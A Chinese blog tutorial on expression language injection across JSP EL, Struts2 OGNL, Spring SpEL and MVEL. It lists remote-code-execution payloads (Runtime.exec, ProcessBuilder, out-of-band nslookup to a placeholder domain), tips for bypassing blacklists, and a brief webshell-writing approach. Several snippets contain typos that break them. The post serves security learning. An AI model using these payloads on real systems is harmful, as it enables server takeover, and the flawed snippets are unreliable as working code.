# 表达式注入初探


## 简介

2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。









## 常用的表达式语言



### JSP—JSTL_EL

#### 基础

EL表达式(表达式语言)是一种**在JSP中内置的语言**(也就是说所有的Java Web服务都必然会支持这种表达式。但是由于各家对其实现的不同，也导致某些漏洞可以在一些Java Web服务中成功利用，而在有的服务中则是无法利用)，可以用作用户访问页面的上下文以及不同作用域的对象，取得对象属性值或者执行简单的运算和判断操作：获取数据、执行运算、获取Web开发常用对象、调用Java方法。



**JSP四大作用域：**

- page：只在一个页面保存数据[`javax.servlet.jsp.PageCotent`]
- request：只在一个请求中保存数据[`java.servlet.httpServletRequest`]
- session：在一次会话中保存数据，仅供单个用户使用[`javax.servlet.http.HttpSession`]
- application：在整个服务器中保存数据，全部用户共享[`javax.servlet.ServletContenxt`]



**EL基础语法：**

在JSP中，用`${}`表示此处为EL表达式。

在未指定作用域时，依次向后寻找；

在指定了作用域时，在范围内寻找：如`${requestScope.name}`表示在request作用域范围内获取name变量。



**获取对象属性：**

一种方法，为：`${对象.属性}`，如`${param.name}`

另一种为，：`[]`符号，如：`${param[name]}`，当属性名存在特殊字符时需要使用此方式



**EL表达式也可以实例化Java的内置类：**

```jsp
//如 Runtime.calss会执行系统命令

<body>
    ${Runtime.getRuntime().exec("calc")}
</body>

```



```jsp
<spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
</spring:message>
```





简答来说，EL表达式是Java代码的简化版，用户可以通过可控的输入注入一段EL表达式执行代码。但用户难以控制EL表达式进行表达式注入。





#### 渗透思路

获取webroot路径，exec执行命令echo写入一句话。











### Struts2—OGNL



表达式格式：

```bash
@[类全名（包括包路径）]@[方法名 | 值名]，例如：
@java.lang.String@format('foo %s', 'bar')
```



基本用法：

```java
ActionContext AC = ActionContext.getContext();
Map Parameters = (Map)AC.getParameters();
String expression = "${(new java.lang.ProcessBuilder('calc')).start()}";
AC.getValueStack().findValue(expression))
```



相关漏洞：s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017、。。。



### Spring—SPEL

SPEL（Spring表达式语言），是Spring框架专有的EL表达式

SpEL使用 `#{…} `作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法



#### **基本用法：**

```jsp
//在jsp页面中可以使用el表达式代替<%=%>，之间访问java对象。

String expression = "T(java.lang.Runtime).getRuntime().exec(/"calc/")";
String result = parser.parseExpression(expression).getValue().toString();
```

1.使用量表达式：

```java
"#{Hello world}"
```

2.使用java代码new/instance of
```java
Expression exp = parsee.parserExpression("new Spring('hello')");

```

3.使用T(type)

表示java.lang.Class实例：

```java
parse.parseExpression(T(Integer).MAX_VALUE)
```

使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符：

```java
#{T(java.lang.Math)}
```

T()运算符的结果会返回一个java.lang.Math类对象。




#### **代码审计关键字：**

```
org.springframework.expression.spel.standard
SpelExpressionParser
parserExpress
expression.getValue()
expression.setValue()
...
```







#### SpEL漏洞

Spring为SpEL提供了两套不同的接口，分别是：

- SimpleEvaluationContext（更安全一些，推荐使用）
- StandardEvaluationContext：包含了SpEL的所有功能





**漏洞原因：**

开发人员未对用户输入进行处理就直接通过解析引擎对Spel继续解析。一旦用户能够控制解析的SpEL语句，便可以通过反射的方式构造代码执行的SpEL语句，从而达到RCE的目的。



例如：

```java
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class TTTTT {
    public static void main(String []args) throws Exception {
        String expr = "T(Runtime).getRuntime.exec(\"calc.exe\")";

        ExpressionParser  parser = new SpelExpressionParser();
        EvaluationContext evaluationContext = new StandardEvaluationContext();
        Expression expression = parser.parseExpression(expr);
        System.out.println(expression.getValue(evaluationContext));


    }
}

```



![](http://image.xpshuai.cn/img/image-20220120172956738.png)



**常用POC：**

```
${255*255}

T(Thread).sleep(10000)

T(java.lang.Runtime),getRuntime().exec('命令')
T(java.lang.Runtime),getRuntime().exec('nslookup xxxxx.com')

new java.lang.ProcessBuilder("命令").start()
new java.lang.ProcessBuilder("nslookup xxxxx.com").start()

#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup xxxxx.com')
```



需要绕过黑名单校验，对于急于正则的匹配绕过是很简单的：

- 利用反射于拆分关键字构造Payload
- 利用ScriptEngineManner









### Elasticsearch——MVEL



基本用法：

```java
java import org.mvel.MVEL;

public class MVELTest {
    public static void main(String[] args) { String expression = "new java.lang.ProcessBuilder(/"calc/").start();";
    Boolean result = (Boolean) MVEL.eval(expression, vars);
    }
}
```









## 参考文章



[(57条消息) Java 安全-手把手教你SPEL表达式注入_4ct10n-CSDN博客_spel表达式注入](https://blog.csdn.net/qq_31481187/article/details/108025512)

[Spring-data-commons(CVE-2018-1273)漏洞分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/172984.html)







---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/  

